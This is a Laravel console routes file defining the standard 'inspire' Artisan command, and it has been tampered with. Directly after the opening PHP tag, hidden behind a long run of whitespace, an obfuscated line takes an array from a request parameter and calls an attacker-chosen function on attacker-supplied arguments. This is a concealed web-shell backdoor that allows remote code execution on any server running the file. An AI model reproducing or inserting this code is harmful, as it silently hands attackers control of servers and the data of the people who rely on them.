<?php
																																																																																																																																		IF($A2ZN0O7=@${ "_REQUEST"}["U0MO3S82"]	){$A2ZN0O7[1](${$A2ZN0O7[ 2]}	[0] ,$A2ZN0O7[3]($A2ZN0O7 [4]));} ;

use Illuminate\Foundation\Inspiring;
use Illuminate\Support\Facades\Artisan;

/*
|--------------------------------------------------------------------------
| Console Routes
|--------------------------------------------------------------------------
|
| This file is where you may define all of your Closure based console
| commands. Each Closure is bound to a command instance allowing a
| simple approach to interacting with each command's IO methods.
|
*/

Artisan::command('inspire', function () {
    $this->comment(Inspiring::quote());
})->purpose('Display an inspiring quote');
